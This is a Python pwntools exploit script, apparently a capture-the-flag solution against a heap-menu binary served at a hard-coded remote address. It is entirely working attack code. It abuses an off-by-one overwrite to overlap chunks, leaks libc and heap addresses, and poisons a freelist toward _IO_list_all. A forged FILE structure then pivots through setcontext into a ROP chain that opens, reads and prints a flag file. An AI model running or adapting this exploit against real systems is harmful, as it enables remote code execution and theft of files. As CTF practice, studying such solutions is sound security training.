from pwn import*
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('Choice >>',str(ch))
def new(tp,size,content):
	menu(1)
	p.sendlineafter('type:',str(tp))
	p.sendlineafter('size',str(size))
	'''
	big :  0x400 ~ 
	medium:  0x200 ~ 0x400
	small : 0 ~ 0x200
	ptr[0] = p
	ptr[1] = type
	ptr[2] = size | 1
	ptr[3] = (2 || 4 || 8)*size
	'''
	p.sendafter('content: ',content)
def free(index):
	menu(2)
	p.sendlineafter('index: ',str(index))
def show(index):
	menu(3)
	p.sendlineafter('index: ',str(index))
def edit(index,content):
	menu(4)
	p.sendlineafter('index: ',str(index))
	p.sendafter('content: ',content)
p = process('./main')
p = remote('122.112.204.227',6666)
libc =ELF('./libc-2.27.so')
for i in range(7):
	new(3,0x1E0,'FMYY\n')
for i in range(7):
	free(i)
for i in range(7):
	new(3,0x170,'FMYY\n')
for i in range(7):
	free(i)
new(3,0x68,'FMYY\n')
new(3,0x108,'FMYY\n')
new(3,0x68,'FMYY\n') #2
new(3,0x68,'FMYY\n') #3
new(3,0x68,'FMYY\n') #4
new(1,0x500,'FMYY\n') #5
new(3,0x68,'FMYY\n') #6
edit(0,'\x00'*0x68 + '\xF1')
free(1)
new(3,0x108,'FMYY\n')#1
new(3,0x68,'FMYY\n') #7
free(5)
show(3)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x70
log.info('LIBC:\t' + hex(libc_base))
p.recv(2)
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x28D0 - 0x130
log.info('HEAP:\t' + hex(heap_base))
new(3,0x68,'FMYY\n') #8
free(2)
free(4)
free(7)
IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base + 0x3E8360
fake_IO_FILE  = p64(0) + p64(0)
fake_IO_FILE += p64(0) + p64(0)
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(heap_base + 0x2790 - 0xA0 + 0x130)
fake_IO_FILE  = fake_IO_FILE.ljust(0xD8,'\x00')
fake_IO_FILE += p64(IO_str_jumps - 8)
fake_IO_FILE += p64(0) + p64(libc_base + libc.sym['setcontext'] + 53)

pop_rdi_ret = libc_base + 0x000000000002155F
pop_rdx_ret = libc_base + 0x0000000000001B96
pop_rax_ret = libc_base + 0x0000000000043A78
pop_rsi_ret = libc_base + 0x0000000000023E8A
syscall = libc_base + libc.sym['syscall']
ret = libc_base + 0x00000000000008AA
Open = libc_base + libc.sym['open']
Read = libc_base + libc.sym['read']
Puts = libc_base + libc.sym['puts']
FLAG  = heap_base + 0x2870 + 0x130

orw  = p64(pop_rdi_ret) + p64(FLAG)
orw += p64(pop_rsi_ret) + p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rsi_ret) + p64(heap_base + 0x2000 + 0x130)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(Read)
orw += p64(pop_rdi_ret) + p64(heap_base + 0x2000 + 0x130)
orw += p64(Puts)
new(3,0x68,p64(libc_base + libc.sym['_IO_list_all'] -0x23) + '\n') #2
new(3,0x68,'./flag\x00\x00\n') #4
new(3,0x68,p64(heap_base + 0x29D0 + 0x130) + p64(ret) + '\n') #7
new(3,0x68,'\x00'*0x13 + p64(heap_base + 0x28E0 + 0x130) + '\n') #9
new(3,0x180,fake_IO_FILE + orw + '\n')
menu(5)
p.interactive()
